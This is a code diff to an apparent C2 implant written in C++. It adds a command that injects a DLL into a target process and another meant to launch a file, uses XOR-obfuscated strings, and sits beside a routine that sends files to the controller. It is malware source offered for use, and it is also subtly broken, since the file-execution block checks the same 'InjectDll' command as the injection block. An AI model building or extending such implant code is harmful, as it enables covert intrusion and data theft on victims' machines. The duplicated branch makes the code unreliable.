@@ -145,7 +145,38 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
             exit(0);
             abort();
         }
-   
+
+
+    /* Enjects dll to process*/
+    if (command.compare("InjectDll") == 0){
+        try{
+            std::istringstream ss(args);
+            std::wstring process;
+            std::string dll;
+            ss >> process;
+            ss >> dll;
+            InjectDll(process.c_str(), dll.c_str());
+        }
+        catch(...){
+            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
+        }
+    }
+
+    /* execute a file*/
+    if (command.compare("InjectDll") == 0){
+        try{
+            std::istringstream ss(args);
+            std::string path;
+            ss >> path;
+            createProcess(path);
+        }
+        catch(...){
+            HttpResponse(xor_string(";fqgd{zgqK~g{z",0x14), implant_id, task_id, results, xor_string("NIAD]ZM",0x28), command);
+        }
+    }
+
+
+
     /* Send Files To C2*/
     if(command.compare("SendToC2") == 0){
             std::istringstream ss(args);
